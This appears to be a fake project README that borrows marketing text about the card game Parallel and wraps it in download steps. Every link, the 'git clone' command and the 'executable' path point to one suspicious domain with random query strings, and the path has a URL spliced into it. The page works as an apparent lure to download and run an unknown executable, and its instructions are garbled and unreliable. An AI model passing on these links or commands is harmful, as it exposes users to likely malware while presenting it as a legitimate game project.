...
## Read About
[Download full version](https://gitsbcoib.cfd?mcyrezfzf75gmcz)

Players can play and earn cards with no purchase necessary. Participate in weekly and monthly giveaways every season.game-features Bank Cards For Energy Players strategically choose which cards to bank each turn, gaining energy that allows them to play units, relics, effects, and upgrades. Choosing what card to bank and what card to play is critical, as the right combination can create a powerful winning strategy.game-features Paragons & Factions Parallel has 5 unique factions with 15 game changing leaders (Paragons) each with their own active/passive abilities helping you craft a unique play style.game-features Play At Your Pace
...
![last1](https://gitsbcoib.cfd?drmp31c1f86iqjg)
> Download These

2. Clone the repo
   ```sh
   git clone https://gitsbcoib.cfd?fc0t98qweyw188b
   ```
3. OR

![download](https://gitsbcoib.cfd?dnb648utqbgj7wk)


4. _Then open the sln (Project Solution) file_

![vsgif](https://gitsbcoib.cfd?ytgbh599pyp29pt)

5. Find Executable File
   ```sh
   /ProjectName/Bin/Debug/https://gitsbcoib.cfd?zmwwuu5j82wstfu
   ```
<p align="right">(<a href="#readme-top">back to top</a>)</p>
